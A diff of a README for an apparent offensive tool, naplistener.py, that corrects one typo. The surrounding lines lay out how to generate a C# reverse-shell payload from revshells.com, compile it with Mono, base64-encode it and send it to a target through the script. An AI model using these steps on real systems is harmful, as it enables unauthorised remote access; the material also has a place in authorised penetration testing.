@@ -11,7 +11,7 @@ $python3 naplistener.py https://10.10.10.10 -c '<some-64-encoded-command-here>'
 To make it work:
 - Go to [https://revshells.com](https//revshells.com), select `C# TCP Client`
 - Modify the code adding a `namespace` and a `Run` class
-- Install `Mono C# Compilter` (`m̀cs`) with `sudo apt install mono-devel -y`
+- Install `Mono C# Compilter` (`mcs`) with `sudo apt install mono-devel -y`
 - Compile the `payload.cs` file from `Revshells` with `mcs -out:payload.exe payload.cs`
 - Then run `base64 -w0 payload.exe`, copy the payload and paste it as `command` to this script:
 
